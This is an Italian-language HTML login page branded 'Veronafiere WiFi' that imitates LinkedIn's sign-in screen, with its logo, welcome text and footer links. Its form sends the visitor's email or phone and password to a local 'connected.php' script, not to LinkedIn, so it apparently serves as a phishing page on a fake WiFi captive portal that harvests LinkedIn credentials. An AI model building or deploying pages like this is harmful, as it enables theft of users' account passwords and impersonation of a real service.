<!doctype html>
<html lang="it">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="stylesheet" href="css/style.css">

    <link rel="shortcut icon" href="img/favicon-2018.png">
    <title>Accedi con LinkedIn | Veronafiere WiFi</title>
</head>
<body>
<main class="linkedin-page">

    <div class="container">
        <div class="row justify-content-md-center">
            <div class="col-12 mt-5 pt-3 text-center">
                <img src="img/LinkedIn_Logo_2013.svg" height="30" alt="LinkedIn Login"><br>
                <h3 class="card-title text-center pb-2 mt-3 mb-2">Piacere di rivederti</h3>
                <h5 class="card-title text-center text-black-50 pb-2 m-0 mb-3">Non perderti la tua prossima opportunità.
                    Accedi per restare al passo con il tuo mondo professionale.</h5>
            </div>

            <div class="col-sm-12 col-md-7 col-lg-5">
                <div class="card border-0 mt-3 mb-5">
                    <div class="card-body">
                        <form method="post" action="connected.php">
                            <div class="form-group">
                                <input type="email" class="form-control" name="email" id="email-input"
                                       placeholder="E-mail o telefono" height="45">
                            </div>
                            <div class="form-group">
                                <input type="password" class="form-control" name="password" id="pwd-input"
                                       placeholder="Password" height="45">
                            </div>
                            <button type="submit" class="btn btn-linkedin btn-block btn-lg" id="login-btn">Accedi
                            </button>

                            <p class="text-center mt-4">
                                <a href="#" class="text-linkedin" id="form-lbl">Hai dimenticato la password?</a>
                            </p>
                        </form>
                    </div>
                </div>

            </div>
        </div>
    </div>
</main>

<footer class="fixed-bottom text-center linkedin-footer">
    <ul class="list-inline">
        <li class="list-inline-item"><img src="/www/img/LinkedIn_Logo_2013.svg" height="20" alt="LinkedIn Logo"> &nbsp; &copy; 2019</li>
        <li class="list-inline-item">Contratto di licenza</li>
        <li class="list-inline-item">Informativa sulla privacy</li>
        <li class="list-inline-item">Linee guida della community</li>
        <li class="list-inline-item">Informativa sui cookie</li>
        <li class="list-inline-item">Informativa sul copyright</li>
        <li class="list-inline-item">Invia commenti</li>
    </ul>
</footer>

<script src="js/jquery-3.4.1.min.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>
</body>
</html>